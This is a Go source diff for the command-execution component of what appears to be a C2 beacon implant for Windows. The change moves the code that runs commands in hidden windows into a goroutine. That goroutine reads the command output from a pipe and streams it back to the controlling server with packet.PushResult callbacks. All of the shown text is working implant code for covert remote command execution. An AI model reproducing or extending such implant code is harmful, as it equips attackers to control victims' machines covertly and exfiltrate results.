@@ -46,12 +46,10 @@ func Run(b []byte) error {
 	if err != nil {
 		return err
 	}
-	result, err := runNative(string(path), string(args))
-	if err != nil {
-		return err
-	}
-	packet.PushResult(packet.CALLBACK_OUTPUT, result)
-	return nil
+	// result was send to server in runNative
+	_, err = runNative(string(path), string(args))
+	return err
+
 	//path = strings.Trim(path, " ")
 	//args = strings.Trim(args, " ")
 	//// handler with `shell` cmd, env var is not fully supported
@@ -120,8 +118,8 @@ func runNative(path string, args string) ([]byte, error) {
 	if err != nil {
 		return nil, errors.New(util.Sprintf("CreatePipe error: %s", err))
 	}
-	defer windows.CloseHandle(hWPipe)
-	defer windows.CloseHandle(hRPipe)
+	// because we need to use go func to send result back asynchronously, so we can't use defer to close handle,
+	// close it manually
 
 	sI.Flags = windows.STARTF_USESTDHANDLES
 	sI.StdErr = hWPipe
@@ -136,49 +134,68 @@ func runNative(path string, args string) ([]byte, error) {
 		resolvedPath := os.Getenv(envKey)
 		pathPtr = windows.StringToUTF16Ptr(resolvedPath)
 	} else {
+		_ = windows.CloseHandle(hWPipe)
+		_ = windows.CloseHandle(hRPipe)
 		return nil, errors.New("path is not null or %COMSPEC%")
 	}
 	err = createProcessNative(pathPtr, windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, &sI, &pI, false)
 
 	if err != nil {
+		_ = windows.CloseHandle(hWPipe)
+		_ = windows.CloseHandle(hRPipe)
 		return nil, err
 	}
-	defer windows.CloseHandle(pI.Process)
-	defer windows.CloseHandle(pI.Thread)
 
-	// some task like tasklist wouldn't exit, only wait for 10 seconds for output
-	// and if time out I may need to kill it manually
-	event, err := windows.WaitForSingleObject(pI.Process, 10*1000)
-	if event == uint32(windows.WAIT_TIMEOUT) {
-		// this only kill target process, if cmd.exe call tasklist.exe,
-		// only cmd.exe will be killed, and tasklist will still exist, which may make beacon cannot exit fully?
-		// but it only occurs in goland, maybe just goland continue tracking subprocesses.
-		defer windows.TerminateProcess(pI.Process, 0)
-	}
-	if err != nil {
-		return nil, err
-	}
-	//_, _ = windows.WaitForSingleObject(pI.Thread, 10*1000)
-
-	// use PeekNamedPipe to determine whether output exist
-	//  if lpTotalBytesAvail is 0, ReadFile will block the whole
-	var lpTotalBytesAvail uint32
-	_, _, err = peekNamedPipe.Call(uintptr(hRPipe), 0, 0, 0, uintptr(unsafe.Pointer(&lpTotalBytesAvail)), 0)
-	if err != nil && err != windows.SEVERITY_SUCCESS {
-		return nil, err
-	}
-	if lpTotalBytesAvail == 0 {
-		return []byte("no output present"), nil
-	} else if lpTotalBytesAvail > 0x80000 {
-		return []byte("output bigger than 0x80000"), nil
-	} else {
-		buf := make([]byte, lpTotalBytesAvail)
-		var bytesRead uint32
-		var read windows.Overlapped
-		_ = windows.ReadFile(hRPipe, buf, &bytesRead, &read)
-
-		return buf[:bytesRead], nil
-	}
+	go func() {
+		defer windows.CloseHandle(pI.Process)
+		defer windows.CloseHandle(pI.Thread)
+		defer windows.CloseHandle(hWPipe)
+		defer windows.CloseHandle(hRPipe)
+		// some task like tasklist wouldn't exit, only wait for 10 seconds for output
+		// and if time out I may need to kill it manually
+		event, err := windows.WaitForSingleObject(pI.Process, 10*1000)
+		if event == uint32(windows.WAIT_TIMEOUT) {
+			// this only kill target process, if cmd.exe call tasklist.exe,
+			// only cmd.exe will be killed, and tasklist will still exist, which may make beacon cannot exit fully?
+			// but it only occurs in goland, maybe just goland continue tracking subprocesses.
+			defer windows.TerminateProcess(pI.Process, 0)
+		}
+		if err != nil {
+			packet.PushResult(packet.CALLBACK_ERROR, []byte(err.Error()))
+		}
+		finish := false
+		for !finish {
+			if event == windows.WAIT_OBJECT_0 {
+				finish = true
+			}
+			// use PeekNamedPipe to determine whether output exist
+			// if lpTotalBytesAvail is 0, ReadFile will block the whole process
+			var lpTotalBytesAvail uint32
+			_, _, err = peekNamedPipe.Call(uintptr(hRPipe), 0, 0, 0, uintptr(unsafe.Pointer(&lpTotalBytesAvail)), 0)
+			if err != nil && err != windows.SEVERITY_SUCCESS {
+				packet.PushResult(packet.CALLBACK_ERROR, []byte(err.Error()))
+			}
+			if lpTotalBytesAvail != 0 {
+				if lpTotalBytesAvail > 0x80000 {
+					packet.PushResult(packet.CALLBACK_OUTPUT, []byte("output bigger than 0x80000"))
+				} else {
+					buf := make([]byte, lpTotalBytesAvail)
+					var bytesRead uint32
+					// Overlapped will be ignored when reading anonymous pipe
+					_ = windows.ReadFile(hRPipe, buf, &bytesRead, nil)
+					packet.PushResult(packet.CALLBACK_OUTPUT, buf[:bytesRead])
+				}
+			}
+			// use WaitForSingleObject to check if process had exit
+			event, err = windows.WaitForSingleObject(pI.Process, 0)
+			if err != nil {
+				packet.PushResult(packet.CALLBACK_ERROR, []byte(err.Error()))
+				break
+			}
+		}
+		packet.PushResult(packet.CALLBACK_OUTPUT, []byte("--------------output end----------------"))
+	}()
+	return nil, nil
 }
 
 func execNative(b []byte) error {
